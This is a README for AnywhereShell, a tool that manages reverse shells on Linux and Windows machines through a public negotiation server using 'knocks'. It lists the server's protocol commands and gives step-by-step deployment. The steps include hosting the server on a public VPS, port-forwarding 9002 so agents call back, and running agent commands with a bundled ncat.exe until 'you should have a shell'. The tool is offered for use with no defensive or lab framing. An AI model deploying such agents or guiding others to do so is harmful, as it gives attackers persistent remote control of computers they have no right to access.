AnywhereShell
=============

Easily manage your reverse-shells by assigning "knocks" to each.

Protocol
=============
The negotiation server is used to register different "knocks" to agents. These knocks are used to identify individual agents. The agent is the assigned a knock that is registered to the negotiation server. When the management console is ready to connect to the agent it tells the negotiation server to set the knock status for that agent from "wait" to "connect." The agent then connects outbound to the management console.


                    > Negotiation-Server <
                   /                      \
                  /                        \
                agent -------------> management-console


Protocol Language
=============

The negotiation server understands the following commands.

Enumerate active knocks
```
> active <
```

Create a new knock
```
> create: $some_knock <
```

Update the status of an agent to connect
```
> update: $some_knock = connect <
```

Update the status of an agent to wait
```
> update: $some_knock = wait <
```

Retrieve ip and status of a $some_knock
```
> select: $some_knock <
```




Compatibility
=============
AnywhereShell is compatible with Linux and Windows. 

Usage
=============
Start the negotiation server on an external VPS. It must be public facing!

```
python negotiate.py
```
Make sure that there is a knock directory in the same directory as negotiate.py. This is where the knocks get stored.

```
mkdir knocks
```

To install the manager extract manager.jar, .knockrc, and scripts/ to the same directory.

On Linux you will have to enable execute privileges.
```
chmod +x manager.jar
*double-click to run* or java -jar manager.jar
```
On your router port-forward 9002 through to the host that has your management console running. This is neccessary so agents can connect back to you.

In the manager create knock "test."

To deploy the agent on a Linux computer run the following command.
```
python agent.py -i $server_ip -k test
```

To deploy the agent on a Windows computer extract the agent.exe and ncat.exe executables from the windows_agent folder.
```
agent.exe -i $server_ip -k test
```

Simply click connect in the management-console using your knock: "test".

You should have a shell!

Register and deploy as many knocks and agents as you want.
